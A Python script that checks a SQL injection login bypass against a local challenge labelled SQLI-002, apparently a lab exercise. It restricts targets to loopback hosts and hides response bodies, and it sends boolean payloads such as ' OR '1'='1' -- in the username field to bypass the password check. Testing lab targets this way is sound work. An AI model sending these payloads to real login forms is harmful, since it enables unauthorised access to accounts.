#!/usr/bin/env python3
"""Loopback-only SQL injection verification draft for SQLI-002.

Only loopback targets are accepted. Redirects are not followed and response
bodies are never printed, so a successful bypass cannot leak credentials into
console logs. Standard library only.
"""
import argparse
import json
import sys
import urllib.error
import urllib.parse
import urllib.request

ALLOWED_HOSTS = {"localhost", "127.0.0.1", "::1"}


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        # Returning None makes urllib raise HTTPError instead of following.
        return None


def check_target(url):
    parsed = urllib.parse.urlsplit(url)
    if parsed.scheme not in ("http", "https"):
        raise SystemExit("only http/https targets are allowed")
    host = (parsed.hostname or "").lower()
    if host not in ALLOWED_HOSTS:
        raise SystemExit("host %r is not loopback; refusing to run" % host)
    return parsed


def post_form(opener, url, fields, timeout):
    data = urllib.parse.urlencode(fields).encode("utf-8")
    req = urllib.request.Request(url, data=data, method="POST")
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    req.add_header("User-Agent", "sqli-002-local-verify/1.0")
    try:
        with opener.open(req, timeout=timeout) as resp:
            return resp.status, resp.read(200000).decode("utf-8", "replace"), None
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read(200000).decode("utf-8", "replace"), "http_error_or_redirect"
    except urllib.error.URLError as exc:
        return None, "", "connection:%s" % exc.reason
    except TimeoutError:
        return None, "", "timeout"


def summarize(status, body, error):
    if error:
        return {"http_status": status, "error": error}
    return {
        "http_status": status,
        "has_success_marker": "flag.jpg" in body,
        "has_failure_marker": "slap.jpg" in body,
        "body_length": len(body),
    }


def main():
    ap = argparse.ArgumentParser(
        description="Loopback-only SQLi draft for SQLI-002; changes only the uname value.")
    ap.add_argument("--url", required=True,
                    help="handler URL, e.g. http://127.0.0.1:8080/sqli-002.php")
    ap.add_argument("--timeout", type=float, default=8.0)
    ap.add_argument("--out", default=None, help="optional JSON result file")
    args = ap.parse_args()

    check_target(args.url)
    opener = urllib.request.build_opener(NoRedirect())

    # Baseline: a username that does not exist, valid SQL.
    baseline = post_form(opener, args.url,
                         {"uname": "probe_user_zz", "passwd": "probe_pass_zz"}, args.timeout)
    # Same request except the injection clause; " -- " comments out the password check.
    true_case = post_form(opener, args.url,
                          {"uname": "probe_user_zz' OR '1'='1' -- ", "passwd": "probe_pass_zz"},
                          args.timeout)
    false_case = post_form(opener, args.url,
                           {"uname": "probe_user_zz' OR '1'='2' -- ", "passwd": "probe_pass_zz"},
                           args.timeout)

    report = {
        "baseline": summarize(*baseline),
        "payload_true": summarize(*true_case),
        "payload_false": summarize(*false_case),
    }
    print(json.dumps(report, ensure_ascii=False, indent=2))
    if args.out:
        with open(args.out, "w", encoding="utf-8") as fh:
            json.dump(report, fh, ensure_ascii=False, indent=2)

    ok = (report["baseline"].get("has_success_marker") is False
          and report["payload_true"].get("has_success_marker") is True
          and report["payload_false"].get("has_success_marker") is False)
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
